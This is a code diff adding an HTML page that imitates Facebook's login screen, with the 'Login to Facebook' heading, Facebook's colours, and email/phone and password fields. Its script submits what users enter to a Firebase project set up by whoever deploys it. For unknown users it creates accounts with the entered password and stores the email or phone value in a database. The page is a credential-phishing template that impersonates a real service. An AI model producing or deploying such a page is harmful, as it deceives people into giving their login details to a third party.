@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Facebook Style Login</title>
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js"></script>
+  <style>
+    body {
+      background-color: #f0f2f5;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .login-box {
+      background-color: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      text-align: center;
+      width: 360px;
+    }
+
+    .login-box h2 {
+      color: #1877f2;
+      font-size: 24px;
+      margin-bottom: 20px;
+    }
+
+    .login-box input {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+
+    .login-box button {
+      background-color: #1877f2;
+      color: white;
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .login-box button:hover {
+      background-color: #145dbf;
+    }
+
+    #status {
+      margin-top: 10px;
+      color: red;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-box">
+    <h2>Login to Facebook</h2>
+    <form id="loginForm">
+      <input type="text" id="emailOrPhone" placeholder="Email or Phone number" required>
+      <input type="password" id="password" placeholder="Password" required>
+      <button type="submit">Log In</button>
+    </form>
+    <div id="status"></div>
+  </div>
+
+  <script>
+    // 🔧 Firebase config (replace with your actual values)
+    const firebaseConfig = {
+      apiKey: "YOUR_API_KEY",
+      authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
+      databaseURL: "https://YOUR_PROJECT_ID.firebaseio.com",
+      projectId: "YOUR_PROJECT_ID",
+      storageBucket: "YOUR_PROJECT_ID.appspot.com",
+      messagingSenderId: "YOUR_SENDER_ID",
+      appId: "YOUR_APP_ID"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const auth = firebase.auth();
+    const database = firebase.database();
+
+    // Listen for form submission
+    document.getElementById('loginForm').addEventListener('submit', function (e) {
+      e.preventDefault();
+      const emailOrPhone = document.getElementById('emailOrPhone').value;
+      const password = document.getElementById('password').value;
+
+      // Treat all input as email. If phone support is needed, additional Firebase phone auth setup is required.
+      auth.signInWithEmailAndPassword(emailOrPhone, password)
+        .then(userCredential => {
+          document.getElementById('status').style.color = "green";
+          document.getElementById('status').innerText = "Login successful!";
+        })
+        .catch(error => {
+          if (error.code === "auth/user-not-found") {
+            // If user doesn't exist, create one (optional)
+            auth.createUserWithEmailAndPassword(emailOrPhone, password)
+              .then(userCredential => {
+                const user = userCredential.user;
+                return database.ref('users/' + user.uid).set({
+                  emailOrPhone: emailOrPhone,
+                  uid: user.uid
+                });
+              })
+              .then(() => {
+                document.getElementById('status').style.color = "green";
+                document.getElementById('status').innerText = "Account created & logged in!";
+              })
+              .catch(err => {
+                document.getElementById('status').innerText = "Error: " + err.message;
+              });
+          } else {
+            document.getElementById('status').innerText = "Error: " + error.message;
+          }
+        });
+    });
+  </script>
+
+</body>
+</html>
